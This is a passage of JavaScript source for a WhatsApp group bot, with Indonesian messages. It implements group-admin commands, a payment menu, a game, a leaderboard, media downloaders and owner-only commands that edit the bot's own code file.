if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
if (!m.isGroup) return reply ("Digunakan Khsus Dalam Group")
let userss = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let ghosst = userss
	try {
   var ppuser = await Tan.profilePictureUrl(ghosst, 'image')
} catch (err) {
   var ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
Tan.sendMessage(from, { image: { url: ppuser }}, { quoted: fcall })
}
break 
//=========================================\\
case 'setppgroup': case 'setgcpp': case 'setgrouppp': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !isTanOwner) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!quoted) return replyTan(`Where is the picture?`)
if (!/image/.test(mime)) return replyTan(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return replyTan(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
var mediz = await Tan.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(mediz)
await Tan.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(mediz)
replyTan(`Success`)
} else {
var memeg = await Tan.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
replyTan(`Success`)
}
}
break
case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !isTanOwner) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
    await Tan.removeProfilePicture(from)
    }
    break
case 'deleteppbot': case 'delppbot': {
if (!isTanOwner) return reply(mess.only.owner)
    await Tan.removeProfilePicture(Tan.user.id)
    replyTan(`Success in deleting bot's profile picture`)
    }
    break
case 'promote': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !isTanOwner) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Tan.groupParticipantsUpdate(m.chat, [users], 'promote')
await replyTan(`Done`)
}
break
case 'demote': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !isTanOwner) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Tan.groupParticipantsUpdate(m.chat, [users], 'demote')
await replyTan(`Done`)
}
break
case 'hidetag': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !isTanOwner) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
Tan.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: fcall })
}
break
case 'ht': {
if (!m.isGroup) return reply(mess.only.group)
if (!isTanOwner) return reply(mess.only.owner)
Tan.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: fcall })
}
break

case 'totag': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !isTanOwner) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
               if (!m.quoted) return replyTan(`Reply message with caption ${prefix + command}`)
               Tan.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
               break

case 'tagall': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !isTanOwner) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
me = m.sender
let teks = `╚»˙·٠${themeemoji}●♥ Tag All ♥●${themeemoji}٠·˙«╝ 
 
 😶 *Tagger :*  @${me.split('@')[0]}
 🌿 *Message : ${q ? q : 'no message'}*\n\n`
for (let mem of participants) {
teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
}
Tan.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: fcall })
}
break
//=========================================\\
//=========================================\\
case 'hd':
  case 'remini':{
if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
if (!quoted) return replyTan(`Where is the picture?`)
			if (!/image/.test(mime)) return replyTan(`Kirim/Balas Foto Dengan caption ${prefix + command}`)
			replyTan(`Sedang Proses Permintaan...`)
			try {
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			Tan.sendMessage(m.chat, { image: proses, caption: `_Sukses Membuat ${command}_`}, { quoted: fcall })
			} catch {
			  reply('yah eror kak')
			}
			}
			break
case 'donate':
case 'pay':
case 'payment': {
  if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
  await Tan.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});
  const url = "https://g.top4top.io/p_3315mdtvp0.jpeg";

  async function image(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: { url }
    }, {
      upload: Tan.waUploadToServer
    });
    return imageMessage;
  }

  let msg = generateWAMessageFromContent(
    m.chat,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: `Berikut daftar metode pembayaran saya ya~`
            },
            carouselMessage: {
              cards: [
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: './data/image/payment/dana.jpg' } }, { upload: Tan.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: ownername,
                    hasMediaAttachment: false
                  }),
                  body: { text: `> Klik tombol DANA di bawah\n> DANA A/N: ${global.andana}` },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        "name": "cta_copy",
                        "buttonParamsJson": `{\"display_text\":\"Payment DANA\",\"id\":\"123456789\",\"copy_code\":\"${global.nodana}\"}`
                      },
                    ],
                  },
                },
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: './data/image/payment/gopay.jpg' } }, { upload: Tan.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: ownername,
                    hasMediaAttachment: false
                  }),
                  body: { text: `> Klik tombol GOPAY di bawah\n> GOPAY A/N: ${global.angopay}` },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        "name": "cta_copy",
                        "buttonParamsJson": `{\"display_text\":\"Payment GOPAY\",\"id\":\"123456789\",\"copy_code\":\"${global.nogopay}\"}`
                      },
                    ],
                  },
                },
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: './data/image/payment/qris.jpg' } }, { upload: Tan.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: ownername,
                    hasMediaAttachment: false
                  }),
                  body: { text: `> SCAN di atas / klik tombol` },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        "name": "cta_url",
                        "buttonParamsJson": `{\"display_text\":\"Payment QRIS\",\"url\":\"https://telegra.ph/file/ac7b0762c24dff7940978.jpgg\",\"merchant_url\":\"https://www.google.com\"}`
                      },
                    ],
                  },
                },
              ],
              messageVersion: 1,
            },
          },
        },
      },
    },
    { quoted: fkontak }
  );

  await Tan.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id,
  });
}
break;
case 'leaderboard': {
  if (!m.isGroup) return reply(mess.only.group)
const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
const { areJidsSameUser } = require ('@whiskeysockets/baileys')
function sort(property, ascending = true) {
  if (property) return (...args) => args[ascending & 1][property] - args[!ascending & 1][property]
  else return (...args) => args[ascending & 1] - args[!ascending & 1]
}

function toNumber(property, _default = 0) {
  if (property) return (a, i, b) => {
    return { ...b[i], [property]: a[property] === undefined ? _default : a[property] }
  }
  else return a => a === undefined ? _default : a
}

function enumGetKey(a) {
  return a.jid
}


/**
 * Detect Number
 * @param {Number} x 
 */
function isNumber(number) {
  if (!number) return number
  number = parseInt(number)
  return typeof number == 'number' && !isNaN(number)
}
const leaderboards = [
    'level',
    'exp',
    'limit',
    'money',
    'iron',
    'gold',
    'diamond',
    'emerald',
    'trash',
    'joinlimit',
    'potion',
    'petFood',
    'wood',
    'rock',
    'string',
    'common',
    'uncommon',
    'mythic',
    'legendary',
    'pet',
    'bank',
    'chip',
    'skata'
]
    let users = Object.entries(global.db.users).map(([key, value]) => {
        return {
            ...value, jid: key
        }
    })
    let imgr = getRandom()
    let leaderboard = leaderboards.filter(v => v && users.filter(user => user && user[v]).length)
    let type = (args[0] || '').toLowerCase()
    const getPage = (item) => Math.ceil((users.filter(user => user && user[item]).length) / 0)
    let wrong = `🔖 ᴛʏᴩᴇ ʟɪsᴛ :
${leaderboard.map(v => `
⮕ ${rpg.emoticon(v)} - ${v}
`.trim()).join('\n')}
––––––––––––––––––––––––
💁🏻‍♂ ᴛɪᴩ :
⮕ ᴛᴏ ᴠɪᴇᴡ ᴅɪғғᴇʀᴇɴᴛ ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ:
${command} [type]
★ ᴇxᴀᴍᴩʟᴇ:
${command} legendary`.trim()
    if (!leaderboard.includes(type))
        return await reply('*–––– 𝙻𝙴𝙰𝙳𝙴𝚁𝙱𝙾𝙰𝚁𝙳––––*\n' + wrong, {
        contextInfo: {
            
        }
    })
    let page = isNumber(args[1]) ? Math.min(Math.max(parseInt(args[1]), 0), getPage(type)): 0
    let sortedItem = users.map(toNumber(type)).sort(sort(type))
    let userItem = sortedItem.map(enumGetKey)
    // let len = args[0] && args[0].length > 0 ? Math.min(100, Math.max(parseInt(args[0]), 5)) : Math.min(5, sortedExp.length)
    let text = `
🏆 ʀᴀɴᴋ: ${userItem.indexOf(m.sender) + 1} ᴏᴜᴛ ᴏғ ${userItem.length}

                *• ${rpg.emoticon(type)} ${type} •*

${sortedItem.slice(page * 0, page * 5 + 5).map((user, i) => `${i + 1}.*﹙${user[type]}﹚*- ${participants.some(p => areJidsSameUser(user.jid, p.id)) ? `${user.registered ? user.name: Tan.getName(user.jid)} \nwa.me/`: 'ғʀᴏᴍ ᴏᴛʜᴇʀ ɢʀᴏᴜᴩ\n @'}${user.jid.split`@`[0]}`).join`\n\n`}
`.trim()
    return await reply(text,{
        contextInfo: {
            mentionedJid: [...userItem.slice(page * 0, page * 5 + 5)].filter(v => !participants.some(p => areJidsSameUser(v, p.id))),
           
        }
    })
}
break
case 'delsesi': 
  case 'clearsession': {
fs.readdir("./session", async function (err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return replyTan('Unable to scan directory: ' + err);
} 
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
   )
console.log(filteredArray.length); 
let teks =`Terdeteksi ${filteredArray.length} file kenangan <3\n\n`
if(filteredArray.length == 0) return replyTan(`${teks}`)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})     
replyTan(`${teks}`) 
await sleep(2000)
replyTan("Menghapus file Kenangan...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./session/${file}`)
});
await sleep(2000)
replyTan("Berhasil menghapus semua Kenangan di folder session")     
});
}
break
case 'tebakgambar': {
  if (!m.isGroup) return reply(mess.only.group)
let timeout = 60000
let id = m.chat
if (id in Tan.tebakkata) return replyTan("Masih Ada Sesi Yang Belum Diselesaikan!")
async function tebakgambar() {
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 return {
      img: result.img,
      jawaban: result.jawaban,
      deskripsi: result.deskripsi
    }}
  let tos = await tebakgambar ()
  console.log(tos)
 let caption = `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${tos.deskripsi}\nWaktu : 60s\nHadiah : 10.000 money`
 Tan.tebakgambar[id] = [
    await Tan.sendMessage(from, {caption: caption, image: {url: tos.img}}, { quoted: fcall }),
    tos,
 setTimeout(() => {
	if (Tan.tebakgambar[id])
 replyTan(`Waktu Habis\nJawaban:  ${tos.jawaban}\n\nIngin bermain? Ketik tebakgambar`)
 delete Tan.tebakgambar[id]
 }, 60000)
	 ]
}
break
//==================================================================
case 'upvn':{
if (!isTanOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
function getRandomHexColor() {
  return "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0");
}
const media = await Tan.downloadAndSaveMediaMessage(quoted)
Tan.sendMessage('status@broadcast', {audio: { url: media }, mimetype: 'audio/mp3', ptt:true },{
backgroundColor: getRandomHexColor(),
statusJidList: Object.keys(db.users)
});
}
reply(`*Sukses mengirim status whatsapp ke  Orang Yang Ada Di database*`)
break
//==================================================================
  case 'addcase': {
    if (!isTanOwner) return reply(mess.only.owner)
    if (!text) return replyTan('Mana case nya');
    const fs = require('fs');
// Nama file yang akan dimodifikasi
const namaFile = 'gos.js';

// Kode case baru yang ingin Anda tambahkan
const caseBaru = `${text}`;

// Baca isi file
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }

    // Cari posisi awal dari kumpulan case 'gimage'
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        // Tambahkan case baru tepat di atas case 'gimage'
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);

        // Tulis kembali file dengan case baru
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                replyTan('Terjadi kesalahan saat menulis file:', err);
            } else {
                replyTan('Case baru berhasil ditambahkan di atas case gimage.');
            }
        });
    } else {
        replyTan('Tidak dapat menemukan case gimage dalam file.');
    }
});

}
break;

case "delcase": {
if (!isTanOwner) return replyTan('Khusus Owner');
if (!q) return replyTan("Masukkan nama case yang ingin dihapus, contoh: delcase gpt4");

let caseName = q

let fileContent = fs.readFileSync("./Shizuka-Md", "utf-8");

let startIndex = fileContent.indexOf(`case "${caseName}"`);
let endIndex = fileContent.indexOf("break", startIndex);

if (startIndex !== -1 && endIndex !== -1) {
let caseToDelete = fileContent.slice(startIndex, endIndex + 6);
fileContent = fileContent.replace(caseToDelete, "");

fs.writeFileSync("./Shizuka-Md", fileContent, "utf-8");

replyTan(`Case "${caseName}" berhasil dihapus!`);
} else {
replyTan(`Tidak dapat menemukan case "${caseName}" untuk dihapus.`);
}
}
break
case 'repo': {
    if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
    if (!text) return replyTan(`_Silakan masukkan nama repositori yang ingin dicari_`);

    replyTan(`Sedang Proses Permintaan...`);

    try {
        // Mengambil data repositori dari API dengan query yang dicari
        const response = await axios.get(`https://github-api-zhirrr.vercel.app/api/searchrepo?q=${encodeURIComponent(text)}`);
        
        // Memeriksa status dari response
        if (response.data.code !== 200) {
            return replyTan(`Gagal mendapatkan data repositori. Status: ${response.data.message}`);
        }

        const repos = response.data.items;

        // Memeriksa apakah repositori ditemukan
        if (!repos || repos.length === 0) {
            return replyTan(`Repositori dengan nama "${text}" tidak ditemukan.`);
        }

        // Menyusun informasi repositori
        let repoInfo = `⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n`;
        repoInfo += `*HASIL PENCARIAN REPOSITORI*\n`;
        repoInfo += `⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n`;

        repos.forEach(repo => {
            repoInfo += `🔧 *Nama Repositori*: [${repo.nameRepo}](${repo.url_repo})\n`;
            repoInfo += `📜 *Deskripsi*: ${repo.description || "Tidak ada deskripsi"}\n`;
            repoInfo += `⭐ *Stargazers*: ${repo.stargazers}\n`;
            repoInfo += `🍴 *Forks*: ${repo.forks}\n`;
            repoInfo += `🌐 *Bahasa*: ${repo.language || "N/A"}\n`;
            repoInfo += `👤 *Pemilik*: [${repo.author.username}](${repo.author.user_github_url})\n`;
            repoInfo += `🖼️ *Avatar Pemilik*: ![Avatar](${repo.author.avatar_url})\n`;
            repoInfo += `📅 *Dibuat Pada*: ${new Date(repo.createdAt).toLocaleDateString()}\n`;
            repoInfo += `⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n`;
        });

        // Mengirim pesan dengan informasi repositori
        Tan.sendMessage(m.chat, {
            text: repoInfo,
        }, {
            quoted: m,
        });
    } catch (error) {
        // Menampilkan error jika terjadi masalah dalam pengambilan data
        replyTan(`⚠️ Gagal mendapatkan data repositori: ${error.message}`);
    }
    break;
}
case 'gitinfo' :
case 'gitstalk' :
case 'infogithub': {
   if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
    if (!text) return replyTan(`_Silakan masukkan username GitHub yang ingin dicari_`);

    replyTan(`Sedang Proses Permintaan...`);

    try {
        const response = await axios.get(`https://github-api-zhirrr.vercel.app/api/detailuser?q=${encodeURIComponent(text)}`);
        if (response.data.code !== 200) {
            return replyTan(`Gagal mendapatkan data pengguna. Status: ${response.data.message}`);
        }

        const user = response.data.user;
        if (!user) {
            return replyTan(`Pengguna dengan username "${text}" tidak ditemukan.`);
        }
        let userInfo = "";
        userInfo += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n";
        userInfo += `*INFORMASI GITHUB*\n`;
        userInfo += `> Nama ${user.name || "N/A"}\n`;
        userInfo += `> Github https://github.com/${user.username}\n`;
        userInfo += `> Dibuat Pada ${new Date(user.createdAt).toLocaleDateString()}\n`;
        userInfo += `> Diperbarui Pada ${new Date(user.updatedAt).toLocaleDateString()}\n`;
        userInfo += `> Perusahaan ${user.company || "N/A"}\n`;
        userInfo += `> Email ${user.email || "N/A"}\n`;
        userInfo += `> Bio ${user.bio || "N/A"}\n`;
        userInfo += `> Pengikut ${user.followers}\n`;
        userInfo += `> Mengikuti ${user.following}\n`;
        userInfo += `> Repositori Publik ${user.publicRepos}\n`;
        userInfo += `> Gists Publik ${user.publicGists}\n`;
        userInfo += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n"
        Tan.sendMessage(m.chat, {
            image: { url: user.avatarUrl || "https://g.top4top.io/p_3315mdtvp0.jpeg" }, 
            caption: userInfo,
        }, {
            quoted: m,
        });
    } catch (error) {
        replyTan(`⚠️ Gagal mendapatkan data pengguna: ${error.message}`);
    }
    break;
}
case 'tiktok':
case 'ttdl':
case 'tt': {
    if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
    if (!text) {
        return reply(`Silakan masukkan link TikTok yang valid. Contoh: ${prefix + command} <link TikTok>`);
    }

    const urlRegex = /(https?:\/\/(?:vm\.)?tiktok\.com\/[^\s]+|https?:\/\/vt\.tiktok\.com\/[^\s]+)/g;
    const match = text.match(urlRegex);

    if (!match || match.length === 0) {
        return reply(`Contoh: ${prefix + command} <link TikTok>`);
    }

    const tiktokUrl = match[0];

    try {
        reply ('Loading.....');
        const axios = require('axios');
        const apiUrl = `https://api.paxsenix.biz.id/dl/tiktok?url=${encodeURIComponent(tiktokUrl)}`;
        const response = await axios.get(apiUrl);

        if (!response.data.ok) {
            return reply('⚠️ Gagal mendapatkan data dari TikTok.');
        }

        const { detail, downloadsUrl } = response.data;
        const {
            author,
            authorProfile,
            authorUsername,
            description,
            cover,
            view,
            like,
            comment,
            share
        } = detail;

        const videoUrl = downloadsUrl.video;
        const musicUrl = downloadsUrl.music;

        if (!videoUrl || !musicUrl) {
            return reply('⚠️ Tidak ada media yang bisa diunduh.');
        }

        await Tan.sendMessage(m.chat, {
            video: { url: videoUrl },
            caption: `✅ Video berhasil didownload!\n🎬 Judul: ${description || 'Tidak tersedia'}\n👤 Creator: ${author} (@${authorUsername})\n👀 Views: ${view}\n👍 Likes: ${like}\n💬 Comments: ${comment}\n🔗 Shares: ${share}`,
            contextInfo: {
                externalAdReply: {
                    title: author,
                    body: description || 'Video TikTok',
                    thumbnailUrl: cover,
                    mediaType: 2,
                    sourceUrl: tiktokUrl
                }
            }
        });

        await Tan.sendMessage(m.chat, {
            audio: { url: musicUrl },
            mimetype: 'audio/mpeg',
            caption: `✅ Musik berhasil didownload!\n🎵 Judul: ${description || 'Tidak tersedia'}`
        });
    } catch (error) {
        reply(`⚠️ Terjadi kesalahan: ${error.message}`);
    }
    break;
}
case 'pindl': {
    if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
    if (!text) {
        return reply(`Silakan masukkan link Pinterest yang valid. Contoh: ${prefix + command} <link Pinterest>`);
    }
    const pinterestUrl = text.trim();
    try {
        reply('Loading.....');
        const pinData = await pinGet(pinterestUrl);

        if (!pinData) {
            return reply('⚠️ Gagal mendapatkan data dari Pinterest.');
        }

        const { title, thumbnail, videoUrl } = pinData;

        if (videoUrl) {
            await Tan.sendMessage(m.chat, {
                video: { url: videoUrl },
                caption: `✅ Video berhasil didownload!\n🎬 Judul: ${title || 'Tidak tersedia'}`,
                contextInfo: {
                    externalAdReply: {
                        title: title,
                        body: 'Video dari Pinterest',
                        thumbnailUrl: thumbnail,
                        mediaType: 2,
                        sourceUrl: pinterestUrl
                    }
                }
            });
        } else {
            const gifUrl = thumbnail;
            const gifPath = path.join(__dirname, 'temp.gif'); 
            const videoPath = path.join(__dirname, 'output.mp4');
            const response = await axios.get(gifUrl, { responseType: 'arraybuffer' });
            fs.writeFileSync(gifPath, response.data);
            await new Promise((resolve, reject) => {
                console.log(`Converting file: ${gifPath} to: ${videoPath}`);

                ffmpeg(gifPath)
                    .on('start', commandLine => {
                        console.log('FFmpeg command line: ', commandLine);
                    })
                    .on('error', (err, stdout, stderr) => {
                        console.error('Error during conversion:', err);
                        console.error('FFmpeg stderr:', stderr);
                        reject(err);
                    })
                    .on('end', () => {
                        console.log(`Conversion completed: ${gifPath} to ${videoPath}`);
                        resolve(videoPath);
                    })
                    .output(videoPath)
                    .outputOptions([
                        '-movflags faststart',
                        '-pix_fmt yuv420p',
                        '-vf', 'scale=trunc(iw/2)*2:trunc(ih/2)*2'
                    ])
                    .run();
            });
            await Tan.sendMessage(m.chat, {
                video: { url: videoPath },
                caption: `✅ GIF berhasil didownload \n🎬 Judul: ${title || 'Tidak tersedia'}`,
                gifPlayback: true
            });
            fs.unlinkSync(gifPath);
            fs.unlinkSync(videoPath); 
        }
    } catch (error) {
        reply(`⚠️ Terjadi kesalahan: ${error.message}`);
    }
    break;
}
case 'ytmp4': {
   if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
    if (!text) {
        return reply(`Silakan masukkan link YouTube yang valid. Contoh: ${prefix + command} <link YouTube>`);
    }

    const urlRegex = /(https?:\/\/(?:www\.)?youtube\.com\/watch\?v=[^\s&]+)/;
    const match = text.match(urlRegex);

    if (!match || match.length === 0) {
        return reply(`Contoh: ${prefix + command} <link YouTube>`);
    }

    const youtubeUrl = match[0];
    try {
        reply('Loading...');
        const tempDir = path.join(__dirname, 'tmp');
        if (!fs.existsSync(tempDir)) {
            fs.mkdirSync(tempDir); 
        }
        const apiUrl = `https://api.paxsenix.biz.id/yt/yttomp4?url=${encodeURIComponent(youtubeUrl)}`;
        const response = await axios.get(apiUrl);

        if (!response.data.ok) {
            return reply('⚠️ Gagal mendapatkan data dari YouTube.');
        }

        const video360Url = response.data.video.find(v => v.name.includes('360p')).url;
        const video720Url = response.data.other.find(v => v.name.includes('720p')).url;
        const audioUrl = response.data.audio.find(a => a.name.includes('128Kbps')).url;
        const video360Path = path.join(tempDir, 'video360.mp4');
        const audioPath = path.join(tempDir, 'audio.mp3');

        const video360Response = await axios({ url: video360Url, responseType: 'stream' });
        const video360Writer = fs.createWriteStream(video360Path);
        video360Response.data.pipe(video360Writer);

        await new Promise(resolve => video360Writer.on('finish', resolve));
        await new Promise((resolve, reject) => {
            ffmpeg(video360Path)
                .noVideo()
                .audioCodec('libmp3lame')
                .audioBitrate(128)
                .save(audioPath)
                .on('end', resolve)
                .on('error', reject);
        });
        const video720Path = path.join(tempDir, 'video720.mp4');
        const video720Response = await axios({ url: video720Url, responseType: 'stream' });
        const video720Writer = fs.createWriteStream(video720Path);
        video720Response.data.pipe(video720Writer);

        await new Promise(resolve => video720Writer.on('finish', resolve));
        const outputPath = path.join(tempDir, 'output.mp4');
        await new Promise((resolve, reject) => {
            ffmpeg()
                .input(video720Path)
                .input(audioPath)
                .videoCodec('copy')
                .audioCodec('copy')
                .save(outputPath)
                .on('end', resolve)
                .on('error', reject);
        });
        await Tan.sendMessage(m.chat, {
            video: { url: outputPath },
            caption: `✅ Video berhasil diunduh!\n🎬 Judul: ${response.data.title}`,
            contextInfo: {
                externalAdReply: {
                    title: response.data.title,
                    body: 'YouTube Video Downloader',
                    thumbnailUrl: response.data.image,
                    mediaType: 2,
                    sourceUrl: youtubeUrl
                }
            }
        });
        fs.unlinkSync(video360Path);
        fs.unlinkSync(video720Path);
        fs.unlinkSync(audioPath);
        fs.unlinkSync(outputPath);
    } catch (error) {
        console.error('Error processing YouTube download:', error);
        reply(`⚠️ Terjadi kesalahan: ${error.message}`);
    }
    break;
}
case 'ytmp3': {
    if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
    if (!text) {
        return reply(`Silakan masukkan link YouTube yang valid. Contoh: ${prefix + command} <link YouTube>`);
    }

    const urlRegex = /(https?:\/\/(?:www\.)?youtube\.com\/watch\?v=[^\s&]+)/;
    const match = text.match(urlRegex);

    if (!match || match.length === 0) {
        return reply(`Contoh: ${prefix + command} <link YouTube>`);
    }

    const youtubeUrl = match[0];
    try {
        reply('Loading...');
        const tempDir = path.join(__dirname, 'tmp');
        if (!fs.existsSync(tempDir)) {
            fs.mkdirSync(tempDir);
        }
        const apiUrl = `https://api.paxsenix.biz.id/yt/yttomp4?url=${encodeURIComponent(youtubeUrl)}`;
        const response = await axios.get(apiUrl);

        if (!response.data.ok) {
            return reply('⚠️ Gagal mendapatkan data dari YouTube.');
        }

        const video360Url = response.data.video.find(v => v.name.includes('360p')).url;
        const video360Path = path.join(tempDir, 'video360.mp4');
        const audioPath = path.join(tempDir, 'audio.mp3');

        const video360Response = await axios({ url: video360Url, responseType: 'stream' });
        const video360Writer = fs.createWriteStream(video360Path);
        video360Response.data.pipe(video360Writer);

        await new Promise(resolve => video360Writer.on('finish', resolve));
        await new Promise((resolve, reject) => {
            ffmpeg(video360Path)
                .noVideo()
                .audioCodec('libmp3lame')
                .audioBitrate(128)
                .save(audioPath)
                .on('end', resolve)
                .on('error', reject);
        });
        await Tan.sendMessage(m.chat, {
            audio: { url: audioPath },
            mimetype: 'audio/mpeg',
            caption: `✅ Musik berhasil dikonversi!\n🎵 Judul: ${response.data.title}`,
            contextInfo: {
                externalAdReply: {
                    title: response.data.title,
                    body: 'YouTube MP3 Downloader',
                    thumbnailUrl: response.data.image,
                    mediaType: 2,
                    sourceUrl: youtubeUrl
                }
            }
        });
        fs.unlinkSync(video360Path);
        fs.unlinkSync(audioPath);
    } catch (error) {
        console.error('Error processing YouTube to MP3:', error);
        reply(`⚠️ Terjadi kesalahan: ${error.message}`);
    }
    break;
}
//=========================================\\======
case 'mute':{
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins && !isTanOwner) return reply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#mute', m.sender, _cmd)
if (isMute) return reply(`Udah Mute`)
mute.push(m.chat)
fs.writeFileSync('./database/mute.json', JSON.stringify(mute, null, 2))
reply('Successfully Mute In This Group')
}
else if (args[0] === "off") {
addCountCmd('#mute', m.sender, _cmd)
if (!isMute) return reply(`Udah Unmute`)
let anu = mute.indexOf(m.chat)
mute.splice(anu, 1)
fs.writeFileSync('./database/mute.json', JSON.stringify(mute, null, 2))
reply('Successfully Unmute In This Group')
}else {
reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'onlygroup':
            case 'onlygc':
                if (!isTanOwner) return reply(mess.only.owner)
                if (args.length < 1) return replyTan(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.settings[botNumber].onlygrub = true
                    replyTan(`Successfully Changed Onlygroup To ${q}`)
                } else if (q == 'off') {
                    db.settings[botNumber].onlygrub = false
                    replyTan(`Successfully Changed Onlygroup To ${q}`)
                }
            break
//=========================================\\======
case 'setwelcome':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isTanOwner && !isAdmins) return reply('Fitur Khusus owner!')
if (!text) return reply(`Gunakan dengan cara ${prefix+command} *teks_welcome*\n\n_Contoh_\n\n${prefix+command} Halo @user, Selamat datang di @group`)
if (isSetWelcome(m.chat, set_welcome_db)) return reply(`Set welcome already active`)
addSetWelcome(text, m.chat, set_welcome_db)
addCountCmd('#setwelcome', m.sender, _cmd)
reply(`Successfully set welcome!`)
break
case 'changewelcome':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isTanOwner && !isAdmins) return reply('Fitur Khusus owner!')
if (!text) return reply(`Gunakan dengan cara ${prefix+command} *teks_welcome*\n\n_Contoh_\n\n${prefix+command} Halo @user, Selamat datang di @group`)
if (isSetWelcome(m.chat, set_welcome_db)) {
addCountCmd('#changewelcome', m.sender, _cmd)
